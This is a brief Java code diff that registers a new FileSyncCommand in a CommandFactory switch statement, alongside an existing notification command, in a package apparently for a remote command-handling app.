@@ -1,6 +1,7 @@
 package com.theah64.xrob.commandcenter;
 
 import com.theah64.xrob.commandcenter.commands.BaseCommand;
+import com.theah64.xrob.commandcenter.commands.FileSyncCommand;
 import com.theah64.xrob.models.Command;
 import com.theah64.xrob.commandcenter.commands.NotificationCommand;
 
@@ -17,6 +18,9 @@ public class CommandFactory {
 
             case Command.COMMAND_NOTIFY:
                 return new NotificationCommand(command.getCommand());
+
+            case Command.COMMAND_FSYNC:
+                return new FileSyncCommand(command.getCommand());
 
             default:
                 throw new BaseCommand.CommandException("Command not defined " + commandType);
